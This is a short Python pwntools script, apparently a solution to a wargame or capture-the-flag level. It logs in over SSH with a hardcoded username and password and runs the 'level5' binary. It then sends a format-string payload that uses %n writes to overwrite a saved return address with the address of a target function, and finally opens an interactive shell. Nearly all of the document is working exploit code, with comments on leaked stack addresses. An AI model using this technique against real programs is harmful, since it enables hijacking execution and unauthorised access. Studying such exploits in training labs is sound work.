from pwn import *

def calculate_padding(bytes_written, desired_byte) :
    desired_byte += 0x100
    bytes_written %= 0x100
    padding = (desired_byte - bytes_written) % 0x100
    if (padding < 10) :
        padding += 0x100
    return padding

# Ret address in GDB -->    0xbffff50c
# address of function 'o' : 0x080484a4

# In GDB, target machine    : 0x%8$x    leaks   0xbffff588
# In pwntools, locally      : 0x%8$x    leaks   0xbffffb28

# There seem to be an offset of 0x5A0 (pwntools addresses are 0x5A0 further in stack memory).
# The return address we want to overwrite should be 0xbffff50c + 0x5A0 = 0xbffffaac

s = ssh(host='192.168.1.45', port=4242, user="level5", password="0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a")
p = s.process("/home/user/level5/./level5")

first_second_bytes_addresses = b"\xac\xfa\xff\xbf\x11\x11\x11\x11\xad\xfa\xff\xbf\x22\x22\x22\x22"
third_fourth_bytes_addresses = b"\xae\xfa\xff\xbf\x33\x33\x33\x33\xaf\xfa\xff\xbf"

jumpers = b"%016u%016u"
payload = first_second_bytes_addresses + third_fourth_bytes_addresses + jumpers
bytes_written = 0x3C

first_byte_padding = calculate_padding(bytes_written, 0xa4)
payload += b"%0" + (str(first_byte_padding)).encode() + b"u%n"
bytes_written += first_byte_padding

second_byte_padding = calculate_padding(bytes_written, 0x84)
payload += b"%0" + (str(second_byte_padding)).encode() + b"u%n"
bytes_written += second_byte_padding

third_byte_padding = calculate_padding(bytes_written, 0x04)
payload += b"%0" + (str(third_byte_padding)).encode() + b"u%n"
bytes_written += third_byte_padding

fourth_byte_padding = calculate_padding(bytes_written, 0x08)
payload += b"%0" + (str(fourth_byte_padding)).encode() + b"u%n"
bytes_written += fourth_byte_padding

p.sendline(payload)
p.interactive()
